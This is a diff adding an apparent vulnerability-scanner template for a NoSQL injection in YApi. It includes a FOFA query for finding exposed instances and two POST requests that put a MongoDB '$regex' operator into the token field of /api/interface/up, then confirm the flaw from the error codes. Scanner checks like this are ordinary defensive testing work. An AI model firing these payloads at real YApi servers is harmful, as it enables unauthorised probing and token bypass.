@@ -1,0 +1,31 @@
+id: poc-yaml-yapi-nosql-inject
+info:
+  name: Yapi NoSQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Yapi
+  fofa: app="YApi"
+requests:
+- method: POST
+  path: /api/interface/up
+  headers:
+    Content-Type: application/json
+  data: '{"id": -1, "token": {"$regex": ""}}
+
+    '
+  expression: 'contains(body, "\"errcode\":") && contains(body, "400,")
+
+    '
+- method: POST
+  path: /api/interface/up
+  headers:
+    Content-Type: application/json
+  data: '{"id": -1, "token": {"$regex": "99999999999"}}
+
+    '
+  expression: 'contains(body, "\"errcode\":") && contains(body, "40011,")
+
+    '
+variables: {}
+transport: http
